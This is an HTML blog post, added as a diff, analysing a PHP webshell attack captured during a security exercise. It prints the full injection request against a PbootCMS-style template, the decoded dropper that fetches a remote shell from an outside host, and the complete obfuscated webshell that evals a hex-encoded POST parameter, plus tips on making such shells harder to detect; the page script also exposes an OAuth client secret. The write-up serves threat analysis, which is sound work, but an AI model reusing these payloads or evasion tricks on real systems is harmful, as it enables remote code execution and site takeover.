@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[PHP webshell]记一次捕获的php免杀马 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="前言
+无聊的HW时候，千篇一律的扫描器，终于遇到一个半人工，payload有点质量。
+捕获payload
+GET /{pboot:if((&quot;file_put_co&quot;.&quot;ntents&quot;)(&quot;t..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[PHP webshell]记一次捕获的php免杀马</h2>
+            <div class="post-date">2024-07-27</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="前言">前言</h2>
+<p>无聊的HW时候，千篇一律的扫描器，终于遇到一个半人工，payload有点质量。</p>
+<h2 id="捕获payload">捕获payload</h2>
+<pre><code class="language-http">GET /{pboot:if((&quot;file_put_co&quot;.&quot;ntents&quot;)(&quot;temp.php&quot;,(&quot;base6&quot;.&quot;4_decode&quot;)(&quot;PD9waHAgCmZpbGVfcHV0X2NvbnRlbnRzKCcuL2NvcmUvYmFzaWMvZnVuLnBocCcsZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9kLnNvZ291YWQudmlwL3R4dC9tYTEudHh0JykpOwplY2hvICd0ZW1wMTExODg4JzsKdW5saW5rKF9fRklMRV9fKTs=&quot;)))}{/pboot:if}/../../?p=20 HTTP/1.1 
+Accept-Encoding:identity 
+Host:
+User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 
+Referer:http://n666888.com 
+Connection:close 
+</code></pre>
+<h2 id="分析">分析</h2>
+<p>具体这个是哪个漏洞的payload不太清楚，网上搜了一下好像是pbootcms，但没有搜到具体的漏洞信息。</p>
+<p>直接把base64编码解码看看。</p>
+<pre><code class="language-php">&lt;?php 
+file_put_contents('./core/basic/fun.php',file_get_contents('http://d.sogouad.vip/txt/ma1.txt'));
+echo 'temp111888';
+unlink(__FILE__);
+</code></pre>
+<p>访问链接地址，发现是个混淆过的php马。</p>
+<p>去微步情报社区搜索相关域名信息，发现不只这一个样本。</p>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1722047676843.png" alt="" loading="lazy"></figure>
+<p>而且ma1.txt这个文件已经被标红了，我们直接找个绿的看看。</p>
+<p><a href="https://s.threatbook.com/report/file/448bd70dce8919641f5b2678b8588b6f390772f6a2b7927f6ac7dfad0bf46ea2">yj.txt</a></p>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1722047800332.png" alt="" loading="lazy"></figure>
+<p>只有一个引擎检出，而且动态分析失败。</p>
+<pre><code class="language-php">&lt;?php
+global $phpjiami_decrypt;
+$phpjiami_decrypt['��î����Ë����֯��������֔��å��']=base64_decode('c3RybGVu'); 
+$phpjiami_decrypt['�������������Ĉ�������Ô���È֯�']=base64_decode('Y2hy');
+$phpjiami_decrypt['����ֈ������֯�������È���������']=base64_decode('aGV4ZGVj'); 
+$phpjiami_decrypt['�þ�Ë���־����È֮Ë��Ô�������']=base64_decode('aGV4VG9TdHI='); ?&gt;
+
+&lt;?php
+class _ {
+    static public $phpcms=Null;
+    function __construct($l=&quot;error&quot;){
+        self::$phpcms=$l;
+        @eval(null.null.self::$phpcms);
+    }
+}
+function hexToStr($hex){
+    $str=&quot;&quot;;
+    for($i=0;$i&lt;$GLOBALS['phpjiami_decrypt']['��î����Ë����֯��������֔��å��']($hex)-1;$i+=2)
+        $str.=$GLOBALS['phpjiami_decrypt']['�������������Ĉ�������Ô���È֯�']($GLOBALS['phpjiami_decrypt']['����ֈ������֯�������È���������']($hex[$i].$hex[$i+1]));
+
+    return $str;
+
+}
+
+$error =null.$GLOBALS['phpjiami_decrypt']['�þ�Ë���־����È֮Ë��Ô�������'](@$_POST[&quot;admin@888&quot;]);
+$d =new _($error);
+
+?&gt;
+</code></pre>
+<p>可以看到这里主要是使用乱码的变量名，来混淆样本，这里自己构造时可以用hex编辑工具来操作。<br>
+<img src="https://fallingskies22.github.io/post-images/1722048087404.png" alt="" loading="lazy"></p>
+<p>然后使用了null.null.self::$phpcms来传递参数，让查杀软件识别不了参数传递关系。</p>
+<p>大概就是这样了，然后传递hex编码后的admin@888参数，即可执行命令。</p>
+<p>感觉这里如果为了再让流量分析困难点，可以将hexToStr中的<code>$hex[$i].$hex[$i+1])</code>交换位置，这样从流量不能一眼发现异常的hex编码。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowsqli-labs/">
+                  <h3 class="post-title">
+                    [ctfshow]sqli-labs
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
